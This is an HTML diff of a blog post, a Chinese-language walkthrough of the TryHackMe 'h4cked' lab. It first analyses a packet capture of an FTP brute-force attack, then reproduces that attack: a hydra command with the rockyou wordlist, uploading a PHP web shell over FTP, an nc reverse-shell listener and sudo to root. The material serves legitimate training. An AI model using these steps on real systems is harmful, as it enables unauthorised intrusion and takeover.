@@ -7,7 +7,7 @@
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <link href="https://gmpg.org/xfn/11" rel="profile">
     
-    <link rel="canonical" href="http://localhost:1313/posts/page1/">
+    <link rel="canonical" href="http://localhost:1313/thm/h4cked/">
     
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -19,21 +19,29 @@
     
     
 
-<title>Page1 • Cookie網</title>
+<title>h4cked • Cookie網</title>
 
 
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Page1">
-  <meta name="twitter:description" content="test page">
+  <meta name="twitter:title" content="h4cked">
+  <meta name="twitter:description" content="h4cked environment KALI Linux ip 10.10.136.98
+TARGET 10.10.194.25
+Oh no! We’ve been hacked! The attacker is trying to log into a specific service. What service is this? 隨便往下滑，即可知道在FTP-Brute-Force
+There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool? Hydra，這題直接直覺猜的，因為5碼還有基本上都是用這工具xD
+The attacker is trying to log on with a specific username. What is the username?">
 
-<meta property="og:url" content="http://localhost:1313/posts/page1/">
+<meta property="og:url" content="http://localhost:1313/thm/h4cked/">
   <meta property="og:site_name" content="Cookie網">
-  <meta property="og:title" content="Page1">
-  <meta property="og:description" content="test page">
+  <meta property="og:title" content="h4cked">
+  <meta property="og:description" content="h4cked environment KALI Linux ip 10.10.136.98
+TARGET 10.10.194.25
+Oh no! We’ve been hacked! The attacker is trying to log into a specific service. What service is this? 隨便往下滑，即可知道在FTP-Brute-Force
+There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool? Hydra，這題直接直覺猜的，因為5碼還有基本上都是用這工具xD
+The attacker is trying to log on with a specific username. What is the username?">
   <meta property="og:locale" content="zh">
   <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
+    <meta property="article:section" content="thm">
     <meta property="article:published_time" content="2024-09-12T23:14:19-04:00">
     <meta property="article:modified_time" content="2024-09-12T23:14:19-04:00">
 
@@ -223,7 +231,7 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
     
 <article>
   <header>
-    <h1>Page1</h1>
+    <h1>h4cked</h1>
     
     
 <div class="post__meta">
@@ -236,7 +244,7 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
     
     
     <br/>
-    <i class="fas fa-clock"></i> 1 min read
+    <i class="fas fa-clock"></i> 2 min read
 </div>
 
 
@@ -244,18 +252,115 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
   
   
   <div class="post">
-    <p>test page</p>
+    <h1 id="h4cked">h4cked</h1>
+<h3 id="environment">environment</h3>
+<p>KALI Linux ip 10.10.136.98</p>
+<p>TARGET 10.10.194.25</p>
+<h3 id="oh-no-weve-been-hacked">Oh no! We&rsquo;ve been hacked!</h3>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> The attacker is trying to log into a specific service. What service is this?</li>
+</ul>
+<p>隨便往下滑，即可知道在FTP-Brute-Force</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192454846-dfa19b47-a439-40c8-b43a-15a5387f84f8.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?</li>
+</ul>
+<p>Hydra，這題直接直覺猜的，因為5碼還有基本上都是用這工具xD</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> The attacker is trying to log on with a specific username. What is the username?</li>
+</ul>
+<p>往下滑及有答案</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192454991-e758dc3e-c9c2-4161-87ad-dbf8c62e74d5.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> What is the user&rsquo;s password?</li>
+</ul>
+<p>找到成功登入封包 Follow -&gt; TCP Stream</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192455214-41820f92-0055-45f8-891b-e8d984ccf363.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> What is the current FTP working directory after the attacker logged in?</li>
+</ul>
+<p>往下找到有執行指令的地方 Follow -&gt; TCP Stream</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192455489-3d90e70e-3e58-44f6-b32e-16a0f5c9fd7e.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> The attacker uploaded a backdoor. What is the backdoor&rsquo;s filename?</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/67756786/192455762-418c2554-184f-4f0f-9125-da82ecae9812.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?</li>
+</ul>
+<p>從 FTP-DATA中查看 Follow -&gt; TCP Stream</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192456134-b9f23bc7-e0e4-4eed-bfba-96796d5762ec.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Which command did the attacker manually execute after getting a reverse shell?</li>
+</ul>
+<p>從GET SHELL.PHP下面幾個封包點選Follow -&gt; TCP Stram</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192456374-3222f767-6286-4faa-9522-c4f266feb317.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> What is the computer&rsquo;s hostname?</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/67756786/192456516-3fa97b38-360b-4fdf-ad5b-5a9d3547e040.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Which command did the attacker execute to spawn a new TTY shell?</li>
+</ul>
+<p>基本上進入後都先執行這個，不然原本的很難用</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192456563-e12ae8ec-80a0-44b9-b3f6-091fd8b2f8be.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Which command was executed to gain a root shell?</li>
+</ul>
+<p>確認自己有root權限後直接root</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192456723-2abbabce-d16a-4e0d-9733-255c3801ccf0.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> The attacker downloaded something from GitHub. What is the name of the GitHub project?</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/67756786/192456812-945201b3-157a-4672-8f5a-f09cb326dc58.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?</li>
+</ul>
+<p>github上有介紹 rootkit</p>
+<h3 id="oh-no-weve-been-hacked-1">Oh no! We&rsquo;ve been hacked!</h3>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.</li>
+</ul>
+<p>原先知道user是jenny，用常見的word list 就用kali內建的rockyou(爆破出來密碼987654321)</p>
+<pre tabindex="0"><code>hydra -l jenny -P /usr/wordlist/wordlist/rockyou.txt ftp://10.10.194.25
+</code></pre><ul>
+<li><input checked="" disabled="" type="checkbox"> Change the necessary values inside the web shell and upload it to the webserver</li>
+</ul>
+<p>登入ftp後，將shell中的ip port改為kali環境的</p>
+<pre tabindex="0"><code>ftp -4 10.10.194.25
+</code></pre><pre tabindex="0"><code>get shell.php
+</code></pre><p>更改shell</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/192473552-a278e3e2-19dd-43a8-bdb1-58c4e954d515.png" alt="image"></p>
+<p>進入ftp後將shell寫上去</p>
+<pre tabindex="0"><code>put shell2.php shell2.php
+</code></pre><ul>
+<li><input checked="" disabled="" type="checkbox"> Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.</li>
+</ul>
+<pre tabindex="0"><code>nc -lvnp 8888
+</code></pre><ul>
+<li><input checked="" disabled="" type="checkbox"> Become root!</li>
+</ul>
+<p>發現先使用su jenny發現jenny有權限即可使用sudo su變成root</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Read the flag.txt file inside the Reptile directory</li>
+</ul>
+<p>進入/root下找flag.txt</p>
 
   </div>
   
 
 <div class="navigation navigation-single">
     
-    <a href="/posts/my-first-post/" class="navigation-prev">
+    <a href="/thm/mr_robot/" class="navigation-prev">
       <i aria-hidden="true" class="fa fa-chevron-left"></i>
-      <span class="navigation-tittle">My First Post</span>
+      <span class="navigation-tittle">Mr.Robot CTF</span>
     </a>
     
+    
+    <a href="/thm/dogcat/" class="navigation-next">
+      <span class="navigation-tittle">DogCat</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
     
 </div>
 
